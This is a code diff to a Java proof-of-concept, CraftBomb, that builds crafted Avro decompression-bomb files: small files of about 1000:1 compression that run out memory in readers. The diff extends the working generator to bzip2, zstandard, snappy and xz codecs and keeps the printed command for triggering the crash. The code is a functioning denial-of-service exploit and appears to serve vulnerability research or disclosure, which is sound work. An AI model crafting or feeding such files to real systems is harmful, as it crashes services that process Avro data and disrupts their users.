@@ -29,14 +29,19 @@ import java.nio.ByteBuffer;
  *     read successfully before the bomb block triggers the crash.
  *
  * Usage:
- *   java poc.CraftBomb [output-file] [decompressed-size-MB]
+ *   java poc.CraftBomb [output-file] [decompressed-size-MB] [codec]
  *
- *   Defaults: crafted-bomb.avro, 50 MB
+ *   Defaults: crafted-bomb.avro, 50 MB, deflate
+ *   Supported codecs: deflate, bzip2, zstandard, snappy, xz
+ *
  *   For a 2 GB bomb:
  *     java -Xmx4g poc.CraftBomb crafted-bomb-2g.avro 2048
  *
- * Result for 50 MB:  ~50 KB on disk  (~1000:1)
- * Result for 2 GB:   ~2 MB on disk   (~1000:1)
+ *   For a bzip2 bomb:
+ *     java -Xmx256m poc.CraftBomb bomb-bzip2.avro 50 bzip2
+ *
+ * Result for 50 MB deflate:  ~50 KB on disk  (~1000:1)
+ * Result for 2 GB deflate:   ~2 MB on disk   (~1000:1)
  */
 public class CraftBomb {
 
@@ -87,13 +92,17 @@ public class CraftBomb {
     public static void main(String[] args) throws Exception {
         String outputFile = args.length > 0 ? args[0] : "crafted-bomb.avro";
         int bombSizeMB    = args.length > 1 ? Integer.parseInt(args[1]) : 50;
+        String codecName  = args.length > 2 ? args[2].toLowerCase() : "deflate";
         long bombSizeBytes = (long) bombSizeMB * 1024 * 1024;
         int numBombRecords = (int) ((bombSizeBytes + CHUNK_SIZE - 1) / CHUNK_SIZE);
+
+        CodecFactory codecFactory = createCodec(codecName);
 
         System.out.println("=== Avro Decompression Bomb -- Crafted File Generator ===");
         System.out.println();
         System.out.println("Output:              " + outputFile);
         System.out.println("Schema:              com.example.events.AuditEvent");
+        System.out.println("Codec:               " + codecName);
         System.out.println("Preamble records:    " + PREAMBLE.length);
         System.out.println("Bomb target size:    " + bombSizeMB + " MB"
                 + " (" + numBombRecords + " x " + (CHUNK_SIZE / (1024*1024)) + " MB records)");
@@ -114,7 +123,7 @@ public class CraftBomb {
         try (DataFileWriter<GenericRecord> writer =
                 new DataFileWriter<>(new GenericDatumWriter<>(schema))) {
 
-            writer.setCodec(CodecFactory.deflateCodec(9));
+            writer.setCodec(codecFactory);
 
             // Avro caps sync interval at 1<<30 (1 GB) and pre-allocates an
             // internal buffer of syncInterval * 1.25.  We size the interval
@@ -185,6 +194,34 @@ public class CraftBomb {
         System.out.println("Trigger with:");
         int suggestedHeap = Math.max(32, bombSizeMB / 4);
         System.out.println("  java -Xmx" + suggestedHeap + "m -cp <jar> poc.TriggerOOM " + outputFile);
+    }
+
+    /**
+     * Create a CodecFactory for the given codec name.
+     * Supported: deflate, bzip2, zstandard (zstd), snappy, xz, null.
+     */
+    private static CodecFactory createCodec(String name) {
+        switch (name.toLowerCase()) {
+            case "deflate":
+                return CodecFactory.deflateCodec(9);
+            case "bzip2":
+                return CodecFactory.bzip2Codec();
+            case "zstandard":
+            case "zstd":
+                return CodecFactory.zstandardCodec(3);
+            case "snappy":
+                return CodecFactory.snappyCodec();
+            case "xz":
+                return CodecFactory.xzCodec(6);
+            case "null":
+            case "none":
+                return CodecFactory.nullCodec();
+            default:
+                System.err.println("Unknown codec: " + name);
+                System.err.println("Supported: deflate, bzip2, zstandard, snappy, xz, null");
+                System.exit(1);
+                return null; // unreachable
+        }
     }
 
     private static String formatSize(long bytes) {
